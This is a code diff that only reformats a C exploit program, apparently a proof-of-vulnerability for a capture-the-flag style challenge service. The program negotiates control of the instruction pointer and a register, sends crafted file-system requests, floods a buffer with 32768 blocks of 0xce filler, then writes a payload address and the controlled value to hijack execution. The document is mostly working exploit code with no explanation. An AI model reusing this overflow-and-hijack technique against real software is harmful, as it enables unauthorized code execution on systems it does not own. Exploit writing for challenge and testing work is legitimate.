@@ -9,24 +9,21 @@ enum {
   UNLINK_F_NUM,
 };
 
-enum
-{
+enum {
   RDONLY = 1 << 0,
-  RDWR   = 1 << 1,
-  TRUNC  = 1 << 2,
+  RDWR = 1 << 1,
+  TRUNC = 1 << 2,
   APPEND = 1 << 3,
 };
 
-#define dumb(__x) ((unsigned char *)(__x))
+#define dumb(__x) ((unsigned char*)(__x))
 
 uint8_t* buffer = NULL;
 uint32_t buffer_cap = 2 << 20;
 uint32_t buffer_len = 0;
 
-void buffer_append(uint8_t* data, uint32_t data_len)
-{
-  if (buffer_len + data_len > buffer_cap)
-  {
+void buffer_append(uint8_t* data, uint32_t data_len) {
+  if (buffer_len + data_len > buffer_cap) {
     uint8_t* new = malloc(buffer_cap * 2);
     memcpy(new, buffer, buffer_len);
     free(buffer);
@@ -40,9 +37,7 @@ void buffer_append(uint8_t* data, uint32_t data_len)
 }
 
 uint64_t delim = 0x8442e492f255bf31;
-int send_req(int fnum, uint8_t* bytes, size_t len)
-{
-
+int send_req(int fnum, uint8_t* bytes, size_t len) {
 #if 1
   buffer_append((uint8_t*)&fnum, sizeof(fnum));
   buffer_append((uint8_t*)&len, sizeof(len));
@@ -56,8 +51,7 @@ int send_req(int fnum, uint8_t* bytes, size_t len)
   return 0;
 }
 
-int uc(int c, const char* path)
-{
+int uc(int c, const char* path) {
   size_t s = 0;
   int mode = 0;
 
@@ -76,18 +70,11 @@ int uc(int c, const char* path)
     return send_req(UNLINK_F_NUM, out, s);
 }
 
-int creat(const char* path)
-{
-  return uc(1, path);
-}
+int creat(const char* path) { return uc(1, path); }
 
-int unlink(const char* path)
-{
-  return uc(0, path);
-}
+int unlink(const char* path) { return uc(0, path); }
 
-int open(const char* path, int flags, int mode)
-{
+int open(const char* path, int flags, int mode) {
   size_t s = 0;
 
   size_t slen = strlen(path) + 1;
@@ -106,24 +93,21 @@ int open(const char* path, int flags, int mode)
   return send_req(OPEN_F_NUM, out, s);
 }
 
-int rw(int r, int fd, size_t count, uint8_t* data)
-{
+int rw(int r, int fd, size_t count, uint8_t* data) {
   static uint8_t out[1024];
   size_t s = 0;
 
   s += sizeof(fd);
   s += sizeof(count);
 
-  if (data)
-  {
+  if (data) {
     s += count;
   }
 
   memcpy(out, dumb(&fd), sizeof(fd));
   memcpy(out + sizeof(fd), dumb(&count), sizeof(count));
 
-  if (data)
-  {
+  if (data) {
     memcpy(out + sizeof(fd) + sizeof(count), data, count);
   }
 
@@ -133,18 +117,13 @@ int rw(int r, int fd, size_t count, uint8_t* data)
     return send_req(WRITE_F_NUM, out, s);
 }
 
-int read(int fd, size_t count)
-{
-  return rw(1, fd, count, NULL);
-}
+int read(int fd, size_t count) { return rw(1, fd, count, NULL); }
 
-int write(int fd, size_t count, uint8_t* data)
-{
+int write(int fd, size_t count, uint8_t* data) {
   return rw(0, fd, count, dumb(data));
 }
 
-int close(int fd)
-{
+int close(int fd) {
   size_t s = 0;
 
   s += sizeof(fd);
@@ -155,8 +134,7 @@ int close(int fd)
   return send_req(CLOSE_F_NUM, out, s);
 }
 
-int lseek(int fd, ssize_t offset, int whence)
-{
+int lseek(int fd, ssize_t offset, int whence) {
   size_t s = 0;
 
   s += sizeof(fd);
@@ -171,42 +149,38 @@ int lseek(int fd, ssize_t offset, int whence)
   return send_req(LSEEK_F_NUM, out, s);
 }
 
+int main(void) {
+  buffer = malloc(buffer_cap);
+  type1_vals t1;
+  type1_negotiate(0xfefefefe, 0xfefefefe, 7, &t1);
 
-int main(void)
-{
-    buffer = malloc(buffer_cap);
-    type1_vals t1;
-    type1_negotiate(0xfefefefe, 0xfefefefe, 7, &t1);
+  if (!t1.ipval) t1.ipval = 0xcccccccc;
+  if (!t1.regval) t1.regval = 0xdddddddd;
 
-    if (!t1.ipval) t1.ipval = 0xcccccccc;
-    if (!t1.regval) t1.regval = 0xdddddddd;
+  creat("/poop");
+  open("/poop", APPEND | RDWR, 0);
+  open("/poop", APPEND | RDWR, 0);
+  close(0);
+  unlink("/poop");
 
-    creat("/poop");
-    open("/poop", APPEND | RDWR, 0);
-    open("/poop", APPEND | RDWR, 0);
-    close(0);
-    unlink("/poop");
+  void* payload_addr_addr = "\x1c\x37\xe4\xb7";
 
-    void* payload_addr_addr = "\x1c\x37\xe4\xb7";
+  uint8_t all_filler_no_killer[4];
+  memset(all_filler_no_killer, 0xce, sizeof(all_filler_no_killer));
+  for (size_t i = 0; i < 32768; ++i) {
+    write(1, sizeof(all_filler_no_killer), all_filler_no_killer);
+  }
+  write(1, sizeof(uint32_t), dumb(payload_addr_addr));
+  write(1, sizeof(uint32_t), dumb(&t1.ipval));
 
-    uint8_t all_filler_no_killer[4];
-    memset(all_filler_no_killer, 0xce, sizeof(all_filler_no_killer));
-    for (size_t i = 0; i < 32768; ++i)
-    {
-      write(1, sizeof(all_filler_no_killer), all_filler_no_killer);
-    }
-    write(1, sizeof(uint32_t), dumb(payload_addr_addr));
-    write(1, sizeof(uint32_t), dumb(&t1.ipval));
+  lseek(1, t1.regval, 0);
+  unsigned done = 0xb7eb7e;
+  transmit_all(STDOUT, buffer, buffer_len);
+  transmit_all(STDOUT, &done, sizeof(done));
 
-    lseek(1, t1.regval, 0);
-    unsigned done = 0xb7eb7e;
-    transmit_all(STDOUT, buffer, buffer_len);
-    transmit_all(STDOUT, &done, sizeof(done));
+  for (size_t i = 0; i < 32771; ++i) {
+    delimited_read(STDIN, NULL, NULL, dumb(&delim), sizeof(delim));
+  }
 
-    for (size_t i = 0; i < 32771; ++i)
-    {
-      delimited_read(STDIN, NULL, NULL, dumb(&delim), sizeof(delim));
-    }
-
-    return 0;
+  return 0;
 }
